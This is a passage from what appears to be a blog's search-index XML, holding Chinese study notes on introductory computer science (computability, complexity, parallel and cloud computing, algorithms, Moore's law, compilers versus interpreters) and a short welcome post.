可计算性：当且仅当它在图灵机上经过有限步骤之后可以得到正确的结果计算复杂度：时间复杂度（计算所需步数或指令条数）和空间复杂度（存储空间大小） 不可计算问题：停机问题，理发师悖论 并行计算：或称平行计算是相对于串行计算来说的。它是一种一次可执行多个指令的算法，目的是提高计算速度，及通过扩大问题求解规模，解决大型而复杂的计算问题。所谓并行计算可分为时间上的并行和空间上的并行。 时间上的并行就是指流水线技术，而空间上的并行则是指用多个处理器并发的执行计算。 云计算是一种按使用量付费的模式，这种模式提供可用的、便捷的、按需的网络访问， 进入可配置的计算资源共享池（资源包括网络，服务器，存储，应用软件，服务），这些资源能够被快速提供，只需投入很少的管理工作，或与服务供应商进行很少的交互。 算法与程序设计算法（Algorithm）是指解题方案的准确而完整的描述，是一系列解决问题的清晰指令，算法代表着用系统的方法描述解决问题的策略机制。也就是说，能够对一定规范的输入，在有限时间内获得所要求的输出。如果一个算法有缺陷，或不适合于某个问题，执行这个算法将不会解决这个问题。不同的算法可能用不同的时间、空间或效率来完成同样的任务。一个算法的优劣可以用空间复杂度与时间复杂度来衡量。特征：有穷性、确切性、输入项（0个或多个）、输出项（一个或多个）、有效性 程序(一组计算机能识别与执行的指令) = 算法(对运算操作的描述) + 数据结构(对数据的描述) 任何简单或复杂的算法都可以由顺序结构、选择结构和循环结构这三种结构组合而成。 摩尔定律 Moore’s Law当价格不变时，集成电路上可容纳的元器件的数目，约每隔18-24个月便会增加一倍，性能也将提升一倍。换言之，每一美元所能买到的电脑性能，将每隔18-24个月翻一倍以上。 编译和解释编译：将源代码一次性由编译器编译转换成机器语言,并保存成二进制文件（静态语言）解释：只在执行程序时，由解释器逐条转换成机器语言给计算机来执行 （脚本语言）]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>CS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Welcome to Supremeyh's blog]]></title>
    <url>%2F2019%2F01%2F18%2Fwelcome%2F</url>
    <content type="text"><![CDATA[Welcome to Supremeyh’s blog!]]></content>
      <categories>
        <category>星辰大海</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>我的文章</tag>
      </tags>
  </entry>
</search>
